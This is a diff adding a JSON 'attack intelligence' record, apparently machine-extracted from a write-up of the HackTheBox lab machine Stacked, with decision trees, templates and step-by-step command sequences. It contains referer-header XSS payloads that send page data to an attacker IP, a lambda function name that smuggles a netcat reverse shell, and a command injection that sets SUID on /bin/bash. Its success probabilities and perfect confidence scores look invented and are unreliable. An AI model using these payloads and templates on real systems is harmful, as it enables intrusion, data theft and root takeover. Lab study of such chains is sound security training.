@@ -1,0 +1,933 @@
+{
+  "writeup_id": "Htb_Stacked",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_container_xss_to_command_injection",
+    "primary_services": [
+      "http",
+      "ssh",
+      "docker"
+    ],
+    "port_signature": "22+80+2376",
+    "service_combination": "ssh+http+docker_api",
+    "os_family": "linux",
+    "environment_type": "containerized_application",
+    "entry_vector": "xss_referer_header",
+    "privilege_path": "xss_to_container_escape",
+    "attack_complexity": "insane",
+    "estimated_time": "4-6 hours",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "referer_header_xss",
+      "localstack_service",
+      "lambda_command_injection",
+      "blind_xss_exploitation"
+    ],
+    "environmental_clues": [
+      "docker_api_exposed",
+      "mail_application_backend",
+      "coming_soon_landing_page",
+      "ubuntu_20_04_focal"
+    ],
+    "similar_scenarios": [
+      "node_blog_htb_insane",
+      "crossfit_htb_insane"
+    ],
+    "unique_aspects": [
+      "localstack_aws_emulation",
+      "iframe_xss_chaining",
+      "container_to_host_privilege_escalation",
+      "pspy_process_monitoring"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "XSS_via_Referer_Header",
+        "success_reason": "Mail application processed referer header without sanitization",
+        "prerequisite_indicators": [
+          "mail_application_accessible",
+          "referer_header_processed",
+          "no_input_sanitization"
+        ],
+        "recognition_patterns": [
+          "email notification systems",
+          "referer header in logs/emails",
+          "automated mail processing",
+          "lack of CSP headers"
+        ],
+        "failure_modes": [
+          "referer_header_sanitized",
+          "csp_blocks_execution",
+          "mail_app_not_processing_headers",
+          "no_automated_email_triggers"
+        ],
+        "environmental_factors": [
+          "legacy_mail_applications",
+          "insufficient_input_validation",
+          "automated_notification_systems"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "30-60 minutes"
+      },
+      {
+        "technique": "LocalStack_Lambda_Command_Injection",
+        "success_reason": "Dashboard displayed malformed function names without sanitization",
+        "prerequisite_indicators": [
+          "localstack_instance_accessible",
+          "lambda_creation_permissions",
+          "dashboard_displays_function_names"
+        ],
+        "recognition_patterns": [
+          "localstack service running",
+          "port 4566/8080 accessible",
+          "lambda function creation API",
+          "web dashboard available"
+        ],
+        "failure_modes": [
+          "function_name_sanitized",
+          "no_dashboard_access",
+          "lambda_creation_restricted",
+          "command_execution_blocked"
+        ],
+        "environmental_factors": [
+          "development_localstack_instance",
+          "unrestricted_lambda_permissions",
+          "vulnerable_dashboard_code"
+        ],
+        "success_probability": 0.78,
+        "typical_timeframe": "20-45 minutes"
+      },
+      {
+        "technique": "Container_Escape_via_Lambda_Execution",
+        "success_reason": "Lambda execution process vulnerable to command injection as root",
+        "prerequisite_indicators": [
+          "root_access_in_container",
+          "lambda_execution_monitoring",
+          "command_injection_in_execution"
+        ],
+        "recognition_patterns": [
+          "pspy shows lambda execution",
+          "root processes executing lambdas",
+          "command injection opportunities",
+          "host filesystem mounted"
+        ],
+        "failure_modes": [
+          "lambda_execution_sandboxed",
+          "no_root_execution",
+          "filesystem_isolation",
+          "command_injection_patched"
+        ],
+        "environmental_factors": [
+          "privileged_container_execution",
+          "host_filesystem_access",
+          "vulnerable_lambda_runtime"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "15-30 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "XSS in referer header processed by mail application",
+        "discovery_method": "Testing referer header manipulation",
+        "why_critical": "Enabled enumeration of hidden mail application and subdomain discovery",
+        "how_to_recognize": [
+          "email notification systems",
+          "referer header processing",
+          "automated mail generation",
+          "lack of input sanitization"
+        ],
+        "follow_up_actions": [
+          "enumerate_mail_application",
+          "discover_hidden_subdomains",
+          "chain_with_other_vulnerabilities",
+          "use_for_internal_reconnaissance"
+        ]
+      },
+      {
+        "discovery": "LocalStack instance with lambda creation permissions",
+        "discovery_method": "Subdomain enumeration via XSS",
+        "why_critical": "Provided attack surface for command injection via malformed function names",
+        "how_to_recognize": [
+          "localstack ports accessible",
+          "lambda API endpoints",
+          "dashboard interface available",
+          "unrestricted function creation"
+        ],
+        "follow_up_actions": [
+          "test_lambda_creation",
+          "analyze_dashboard_functionality",
+          "test_command_injection_vectors",
+          "monitor_execution_processes"
+        ]
+      },
+      {
+        "discovery": "Host filesystem access from container",
+        "discovery_method": "Process monitoring with pspy",
+        "why_critical": "Enabled container escape to full host access",
+        "how_to_recognize": [
+          "mounted host directories",
+          "privileged container execution",
+          "root processes in container",
+          "filesystem permissions"
+        ],
+        "follow_up_actions": [
+          "explore_host_filesystem",
+          "establish_persistent_access",
+          "escalate_to_host_shell",
+          "maintain_access"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "unauthenticated_external",
+        "escalation_method": "XSS_to_internal_reconnaissance",
+        "why_possible": "Mail application processed referer headers without sanitization",
+        "recognition_signs": [
+          "email_notification_systems",
+          "referer_header_in_emails",
+          "automated_mail_processing",
+          "javascript_execution_context"
+        ],
+        "exploitation_path": "Referer XSS → Mail App Access → Subdomain Discovery"
+      },
+      {
+        "privilege_level": "internal_network_access",
+        "escalation_method": "LocalStack_command_injection",
+        "why_possible": "Dashboard displayed function names without proper sanitization",
+        "recognition_signs": [
+          "localstack_dashboard_accessible",
+          "lambda_function_creation",
+          "malformed_name_processing",
+          "command_execution_context"
+        ],
+        "exploitation_path": "Lambda Creation → Malformed Name → Command Injection → Container Shell"
+      },
+      {
+        "privilege_level": "container_root",
+        "escalation_method": "Lambda_execution_injection_to_host",
+        "why_possible": "Lambda execution process ran as root with command injection vulnerability",
+        "recognition_signs": [
+          "root_lambda_execution",
+          "host_filesystem_mounted",
+          "privileged_container_mode",
+          "command_injection_in_runtime"
+        ],
+        "exploitation_path": "Container Root → Lambda Execution Injection → Host Filesystem → Host Shell"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80,2376 open on Linux host with Docker service",
+        "decision": "Enumerate web services first, then investigate Docker API",
+        "reasoning": "Docker API on 2376 could provide container access, but web apps often have easier entry points",
+        "confidence": 0.8,
+        "alternatives": [
+          {
+            "option": "docker_api_enumeration",
+            "when": "if web enumeration fails"
+          },
+          {
+            "option": "ssh_enumeration",
+            "when": "if credentials found"
+          }
+        ],
+        "success_indicators": [
+          "web_forms_found",
+          "subdomains_discovered",
+          "docker_compose_file_found"
+        ],
+        "next_decision": "analyze_web_application_attack_surface"
+      },
+      {
+        "step": 2,
+        "situation": "Found portfolio subdomain with contact form and LocalStack references",
+        "decision": "Test contact form for XSS and injection vulnerabilities",
+        "reasoning": "Contact forms often trigger email notifications that may be vulnerable to XSS",
+        "confidence": 0.75,
+        "prerequisites": [
+          "contact_form_identified",
+          "form_submission_working"
+        ],
+        "success_indicators": [
+          "form_accepts_malicious_input",
+          "email_notification_suspected"
+        ],
+        "failure_fallbacks": [
+          "directory_bruteforce",
+          "parameter_fuzzing",
+          "docker_api_testing"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Contact form accepts input and mentions email notifications",
+        "decision": "Test XSS in referer header and form fields",
+        "reasoning": "Email applications often display referer headers and form data without proper sanitization",
+        "confidence": 0.7,
+        "prerequisites": [
+          "form_submission_confirmed",
+          "email_backend_suspected"
+        ],
+        "success_indicators": [
+          "xss_payload_accepted",
+          "no_immediate_error_response"
+        ],
+        "failure_fallbacks": [
+          "test_other_headers",
+          "sql_injection_testing",
+          "file_upload_testing"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_xss_succeeds": {
+        "action": "enumerate_internal_applications",
+        "tools": [
+          "burp_collaborator",
+          "custom_xss_payloads"
+        ],
+        "next_phase": "internal_service_discovery"
+      },
+      "if_xss_fails": {
+        "action": "test_docker_api_access",
+        "alternatives": [
+          "docker_api_enumeration",
+          "certificate_analysis",
+          "ssh_bruteforce"
+        ],
+        "decision_criteria": "based_on_docker_service_response"
+      },
+      "if_localstack_discovered": {
+        "action": "exploit_lambda_functionality",
+        "purpose": "achieve_code_execution",
+        "tools": [
+          "aws_cli",
+          "lambda_payloads",
+          "command_injection_tests"
+        ]
+      },
+      "if_container_access_gained": {
+        "action": "container_escape_enumeration",
+        "purpose": "escalate_to_host_system",
+        "tools": [
+          "pspy",
+          "docker_socket_access",
+          "filesystem_enumeration"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_referer_header_xss_on_contact_forms",
+        "reasoning": "email_applications_commonly_display_referer_without_sanitization",
+        "applicability": "contact_forms_with_email_backend"
+      },
+      {
+        "rule": "enumerate_internal_services_after_xss_success",
+        "reasoning": "xss_provides_internal_network_access_for_reconnaissance",
+        "applicability": "successful_xss_in_email_application"
+      },
+      {
+        "rule": "test_lambda_command_injection_in_localstack",
+        "reasoning": "localstack_lambda_functions_often_vulnerable_to_command_injection",
+        "applicability": "localstack_service_discovered"
+      },
+      {
+        "rule": "monitor_processes_with_pspy_in_containers",
+        "reasoning": "container_processes_may_reveal_privilege_escalation_paths",
+        "applicability": "container_access_obtained"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "XSS_Referer_Header",
+        "mitre_id": "T1059.007",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "referer_header_processed",
+          "email_or_logging_system_displays_headers"
+        ],
+        "success_indicators": [
+          "referer_header_reflected_in_response",
+          "email_notifications_enabled",
+          "admin_panel_or_dashboard_present"
+        ],
+        "incompatible_with": [
+          "referer_header_sanitized",
+          "csp_blocks_inline_scripts",
+          "no_user_interaction_with_logs"
+        ],
+        "confidence_boosters": [
+          "contact_forms_present",
+          "email_notification_features",
+          "admin_monitoring_systems"
+        ],
+        "typical_success_rate": 0.45,
+        "estimated_time": "30-60 minutes"
+      },
+      {
+        "technique": "Subdomain_Enumeration",
+        "mitre_id": "T1590.001",
+        "required_services": [
+          "dns",
+          "http"
+        ],
+        "required_ports": [
+          53,
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "domain_name_identified",
+          "dns_resolution_available",
+          "virtual_hosts_configured"
+        ],
+        "success_indicators": [
+          "different_response_codes",
+          "different_content_lengths",
+          "unique_service_responses"
+        ],
+        "incompatible_with": [
+          "wildcard_dns_responses",
+          "uniform_error_pages",
+          "strict_host_header_validation"
+        ],
+        "confidence_boosters": [
+          "ssl_certificate_san_entries",
+          "corporate_naming_conventions",
+          "development_environments"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "Docker_API_Exploitation",
+        "mitre_id": "T1611",
+        "required_services": [
+          "docker"
+        ],
+        "required_ports": [
+          2375,
+          2376
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "docker_daemon_exposed",
+          "api_accessible_remotely",
+          "container_runtime_present"
+        ],
+        "success_indicators": [
+          "docker_version_response",
+          "container_listing_successful",
+          "image_pull_capabilities"
+        ],
+        "incompatible_with": [
+          "tls_client_authentication_required",
+          "api_completely_firewalled",
+          "docker_daemon_not_running"
+        ],
+        "confidence_boosters": [
+          "ssl_certificate_with_docker_context",
+          "standard_docker_ports_open",
+          "container_orchestration_indicators"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-30 minutes"
+      },
+      {
+        "technique": "Lambda_Command_Injection",
+        "mitre_id": "T1059.004",
+        "required_services": [
+          "http",
+          "localstack"
+        ],
+        "required_ports": [
+          4566,
+          8080
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "localstack_service_running",
+          "lambda_function_creation_allowed",
+          "dashboard_displays_function_names"
+        ],
+        "success_indicators": [
+          "malformed_function_names_accepted",
+          "dashboard_renders_without_sanitization",
+          "command_execution_in_response"
+        ],
+        "incompatible_with": [
+          "input_sanitization_enabled",
+          "restricted_function_naming",
+          "sandboxed_execution_environment"
+        ],
+        "confidence_boosters": [
+          "localstack_default_configuration",
+          "development_environment_indicators",
+          "unrestricted_api_access"
+        ],
+        "typical_success_rate": 0.55,
+        "estimated_time": "20-45 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "apache",
+          "nginx"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "nginx",
+          "IIS"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "docker_environment": {
+        "port_indicators": [
+          2375,
+          2376
+        ],
+        "service_indicators": [
+          "docker"
+        ],
+        "banner_indicators": [
+          "Docker",
+          "containerd"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "localstack": {
+        "port_indicators": [
+          4566,
+          4571
+        ],
+        "service_indicators": [
+          "localstack",
+          "aws"
+        ],
+        "banner_indicators": [
+          "LocalStack",
+          "AWS"
+        ],
+        "confidence_threshold": 0.8
+      },
+      "email_system": {
+        "port_indicators": [
+          25,
+          587,
+          993,
+          995
+        ],
+        "service_indicators": [
+          "smtp",
+          "imap",
+          "pop3"
+        ],
+        "banner_indicators": [
+          "Postfix",
+          "Dovecot",
+          "Exchange"
+        ],
+        "confidence_threshold": 0.75
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "subdomain_enumeration",
+          "when": "domain_name_identified",
+          "reason": "often_reveals_additional_attack_surface"
+        },
+        {
+          "attack": "docker_api_exploitation",
+          "when": "docker_ports_detected",
+          "reason": "direct_container_access_possible"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "xss_referer_header",
+          "when": "web_forms_present",
+          "reason": "requires_user_interaction_but_effective"
+        },
+        {
+          "attack": "lambda_command_injection",
+          "when": "localstack_detected",
+          "reason": "specific_to_development_environments"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "XSS via Referer Header",
+        "mitre_id": "T1189",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -X POST -H 'Referer: {xss_payload}' -d '{form_data}' {target_url}",
+            "actual_command": "curl -X POST -H 'Referer: <script>document.location=\"http://10.10.14.6/referer\"</script>' -d 'fullname=test&email=test@test.com&tel=012345667890&subject=test&message=test' http://portfolio.stacked.htb/process.php",
+            "output_pattern": "HTTP request to attacker server",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          },
+          {
+            "name": "python_webserver",
+            "command_template": "python3 -m http.server {port}",
+            "actual_command": "python3 -m http.server 80",
+            "success_factors": [
+              "xss_payload_executed",
+              "callback_received"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "contact_form_available",
+          "referer_header_processed_by_backend",
+          "mail_application_renders_html"
+        ],
+        "success_indicators": [
+          "http_request_received_from_target",
+          "javascript_execution_confirmed",
+          "access_to_internal_applications"
+        ],
+        "common_failures": [
+          "client_side_xss_filtering",
+          "server_side_input_validation",
+          "csp_headers_blocking_execution"
+        ],
+        "follow_up_techniques": [
+          "internal_application_enumeration",
+          "iframe_injection",
+          "command_injection_via_xss"
+        ],
+        "time_investment": "30-60 minutes",
+        "skill_level": "advanced"
+      },
+      {
+        "name": "LocalStack Lambda Command Injection",
+        "mitre_id": "T1059.004",
+        "category": "execution",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "aws_cli",
+            "command_template": "aws --endpoint-url={localstack_url} lambda create-function --function-name '{malicious_name}' --runtime python3.8 --role arn:aws:iam::123456789012:role/lambda-role --handler lambda_function.lambda_handler --zip-file fileb://function.zip",
+            "actual_command": "aws --endpoint-url=http://localstack.stacked.htb:4566 lambda create-function --function-name ';nc 10.10.14.6 443 -e /bin/bash;' --runtime python3.8 --role arn:aws:iam::123456789012:role/lambda-role --handler lambda_function.lambda_handler --zip-file fileb://function.zip",
+            "output_pattern": "function_created_successfully",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "netcat",
+            "command_template": "nc -lvnp {port}",
+            "actual_command": "nc -lvnp 443",
+            "success_factors": [
+              "command_injection_in_function_name",
+              "dashboard_loads_function"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "localstack_instance_accessible",
+          "lambda_service_enabled",
+          "dashboard_displays_function_names"
+        ],
+        "success_indicators": [
+          "reverse_shell_connection_established",
+          "command_execution_in_container",
+          "access_to_localstack_environment"
+        ],
+        "common_failures": [
+          "input_sanitization_implemented",
+          "network_connectivity_blocked",
+          "lambda_service_not_available"
+        ],
+        "follow_up_techniques": [
+          "container_escape",
+          "process_monitoring_with_pspy",
+          "host_filesystem_access"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Container Escape via Lambda Execution",
+        "mitre_id": "T1611",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "pspy",
+            "command_template": "./pspy64 -pf -i 1000",
+            "actual_command": "./pspy64 -pf -i 1000",
+            "output_pattern": "root_processes_executing_lambda",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "aws_lambda_invoke",
+            "command_template": "aws --endpoint-url={localstack_url} lambda invoke --function-name '{function_with_injection}' response.json",
+            "actual_command": "aws --endpoint-url=http://localhost:4566 lambda invoke --function-name ';chmod +s /bin/bash;' response.json",
+            "success_factors": [
+              "lambda_execution_as_root",
+              "command_injection_in_execution_path"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "access_to_localstack_container",
+          "lambda_functions_execute_as_root",
+          "command_injection_in_lambda_handler"
+        ],
+        "success_indicators": [
+          "root_command_execution_observed",
+          "privilege_escalation_successful",
+          "host_filesystem_access_gained"
+        ],
+        "common_failures": [
+          "lambda_execution_sandboxed",
+          "insufficient_container_privileges",
+          "command_injection_patched"
+        ],
+        "follow_up_techniques": [
+          "host_filesystem_enumeration",
+          "ssh_key_extraction",
+          "persistent_access_establishment"
+        ],
+        "time_investment": "20-45 minutes",
+        "skill_level": "advanced"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "pspy",
+        "use_case": "process_monitoring_in_containers",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "container_privilege_escalation",
+          "process_analysis"
+        ],
+        "alternatives": [
+          "ps_monitoring_scripts",
+          "auditd"
+        ],
+        "best_practices": [
+          "run_with_frequent_intervals_during_testing",
+          "monitor_during_application_interactions",
+          "focus_on_root_process_execution"
+        ]
+      },
+      {
+        "tool": "LocalStack",
+        "use_case": "aws_service_emulation_exploitation",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "medium",
+        "essential_for": [
+          "cloud_service_testing",
+          "aws_exploitation"
+        ],
+        "alternatives": [
+          "direct_aws_cli",
+          "boto3_scripts"
+        ],
+        "best_practices": [
+          "enumerate_available_services_first",
+          "test_for_command_injection_in_parameters",
+          "check_dashboard_for_reflected_content"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "xss_to_localstack_discovery",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl -X POST -H 'Referer: <script>document.location=\"http://10.10.14.6/referer\"</script>' -d 'fullname=test&email=test@test.com&tel=012345667890&subject=test&message=test' http://portfolio.stacked.htb/process.php",
+            "purpose": "Trigger XSS via referer header",
+            "expected_output": "HTTP request to attacker server"
+          },
+          {
+            "step": 2,
+            "command": "python3 -m http.server 80",
+            "purpose": "Capture XSS callback and enumerate internal services",
+            "expected_output": "Discovery of localstack subdomain"
+          },
+          {
+            "step": 3,
+            "command": "curl -H 'Referer: <script>fetch(\"http://localstack.stacked.htb:4566\").then(r=>r.text()).then(d=>fetch(\"http://10.10.14.6/\"+btoa(d)))</script>' -X POST -d 'fullname=test&email=test@test.com&tel=012345667890&subject=test&message=test' http://portfolio.stacked.htb/process.php",
+            "purpose": "Enumerate localstack services via XSS",
+            "expected_output": "LocalStack service information"
+          }
+        ],
+        "success_rate": 0.75,
+        "typical_duration": "45-90 minutes"
+      },
+      {
+        "sequence_name": "localstack_lambda_exploitation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "echo 'def lambda_handler(event, context): return \"hello\"' > lambda_function.py && zip function.zip lambda_function.py",
+            "purpose": "Create basic lambda function",
+            "expected_output": "Lambda function zip file created"
+          },
+          {
+            "step": 2,
+            "command": "aws --endpoint-url=http://localstack.stacked.htb:4566 lambda create-function --function-name ';nc 10.10.14.6 443 -e /bin/bash;' --runtime python3.8 --role arn:aws:iam::123456789012:role/lambda-role --handler lambda_function.lambda_handler --zip-file fileb://function.zip",
+            "purpose": "Create lambda with malicious name for command injection",
+            "expected_output": "Function created with injected command"
+          },
+          {
+            "step": 3,
+            "command": "curl -H 'Referer: <iframe src=\"http://localstack.stacked.htb:8080\"></iframe>' -X POST -d 'fullname=test&email=test@test.com&tel=012345667890&subject=test&message=test' http://portfolio.stacked.htb/process.php",
+            "purpose": "Trigger dashboard load via XSS to execute command injection",
+            "expected_output": "Reverse shell connection established"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "30-60 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Stacked",
+      "difficulty": "Insane",
+      "os": "Linux",
+      "platform": "HackTheBox",
+      "release_date": "2021-09-18",
+      "author": "TheCyberGeek",
+      "estimated_time": "4-8 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "very_high",
+      "skill_level_required": "expert",
+      "primary_attack_vectors": [
+        "xss",
+        "command_injection",
+        "container_escape"
+      ],
+      "key_vulnerabilities": [
+        "referer_header_xss",
+        "lambda_command_injection",
+        "localstack_privilege_escalation"
+      ],
+      "environment_type": "containerized_cloud_services",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "advanced_xss_techniques",
+        "cloud_service_exploitation",
+        "container_security"
+      ],
+      "prerequisite_knowledge": [
+        "web_exploitation",
+        "docker_containers",
+        "aws_lambda",
+        "linux_privilege_escalation"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "xss",
+        "command_injection",
+        "container_escape"
+      ],
+      "attack_types": [
+        "client_side_attacks",
+        "code_injection",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "input_sanitization",
+        "container_hardening",
+        "service_isolation",
+        "header_validation"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Bucket",
+        "Crossfit",
+        "Ophiuchi"
+      ],
+      "similarity_reasons": [
+        "cloud_services",
+        "container_exploitation",
+        "complex_attack_chains"
+      ],
+      "unique_aspects": [
+        "referer_header_xss",
+        "localstack_exploitation",
+        "iframe_xss_chaining"
+      ],
+      "difficulty_factors": [
+        "blind_xss_exploitation",
+        "multi_stage_attack_chain",
+        "container_privilege_escalation"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T12:37:33.689717",
+    "original_file": "0xdf_writeups/Htb Stacked.md",
+    "content_length": 67678,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
